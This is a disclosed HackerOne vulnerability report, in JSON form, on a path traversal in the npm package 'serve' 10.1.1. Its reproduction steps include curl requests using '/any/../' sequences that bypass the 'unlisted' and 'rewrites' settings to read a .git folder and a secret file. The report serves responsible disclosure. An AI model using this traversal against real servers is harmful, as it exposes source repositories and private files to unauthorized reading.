{
  "id": 486933,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODY5MzM=",
  "url": "https://hackerone.com/reports/486933",
  "title": "[serve] Access unlisted internal files/folders revealing sensitive information",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2019-01-27T15:55:48.066Z",
  "submitted_at": "2019-01-27T15:55:48.066Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "skyn3t",
    "url": "/skyn3t",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-02-07T21:22:35.524Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-02-07T21:22:27.729Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report sensitive information disclosure in serve.\nBypass of #308721 in ways.\n\n# Module\n\n**module name:** serve\n**version:** 10.1.1\n**npm page:** `https://www.npmjs.com/package/serve\n\n## Module Description\n\nAssuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.\n\nIt behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.\n\nFurthermore, it provides a neat interface for listing the directory's contents\n\n## Module Stats\n\n**weekly downloads**\n138,377\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe `serve` modules allows directory browsing and to serve static files through the browser.\nThe config options `unlisted` and `rewrites` can be used to tell the module which file or directory are forbidden and should not be served. \nrefer: https://github.com/zeit/serve-handler/issues/48\nThis rule can be bypassed using the technique below which can lead to sensitive information disclosure (An interesting example: https://smitka.me/).\n\n## Steps To Reproduce:\n\n- Install `serve`\n```\n$ npm install -g serve\n```\n\n- Inside a project directory, initialise `git` and create `404.html`.\n```\n$ git init\n$ echo \"404 Not Found\" > 404.html\n$ echo \"secret text\" > secret\n```\n\n- Add rule to ignore `.git` folder in `serve.json`\n```json\n{\n    \"rewrites\": [\n        { \"source\": \".git/**\", \"destination\": \"/404.html\" },\n        { \"source\": \"secret\", \"destination\": \"/404.html\" }\n      ],\n    \"unlisted\": [\n      \".git\"\n    ]\n  }\n```\n\n- Start `serve` in current directory.\n\n```\n$ serve\nINFO: Discovered configuration in `serve.json`\n   ┌───────────────────────────────────────────────┐\n   │                                               │\n   │   Serving!                                    │\n   │                                               │\n   │   - Local:            http://localhost:5000   │\n   │   - On Your Network:  http://127.0.1.1:5000   │\n   │                                               │\n   │   Copied local address to clipboard!          │\n   │                                               │\n   └───────────────────────────────────────────────┘\n```\n\n- Now, current directory will be served by `serve` with the exception of folder `.git` and file `secret`.\n- If we try to curl `.git`or `secret` we get a Not Found error\n```\n$ curl http://localhost:5000/.git --path-as-is     \n404 Not Found\n$ curl http://localhost:5000/secret --path-as-is\n404 Not Found\n```\n\n- Although if we request any other url and then navigate back to the forbidden files/folders using `../` scheme, we are able to extract it's contents successfully.\n```\n$ curl http://localhost:5000/any/../.git/HEAD --path-as-is\nref: refs/heads/master\n$ curl http://localhost:5000/any/../secret --path-as-is   \nsecret text\n```\n\n\n## Supporting Material/References:\n\n- Ubuntu 16.04\n- node v11.3.0\n- npm 6.7.0\n\n# Wrap up\n\n\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nThe essentially bypasses the `unlisted` and `rewrites` files/folders feature and allows an attacker to read from a directory/file that the victim has not allowed access to.\n\n**References:**\n- https://github.com/zeit/serve-handler#options\n- https://github.com/zeit/serve-handler/issues/48",
  "weakness": {
    "id": 89,
    "name": "Information Exposure Through Directory Listing"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-03-09T21:22:27.828Z",
  "allow_singular_disclosure_after": -155663679.79905424,
  "singular_disclosure_allowed": true,
  "vote_count": 13,
  "voters": [
    "bughunterninja",
    "sameerphad72",
    "bl4de",
    "savitar0x01",
    "skyn3t",
    "eveeez",
    "khizer47",
    "codeanddecode",
    "cyberunit",
    "gtrgef",
    "and 3 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 5006,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "serve",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
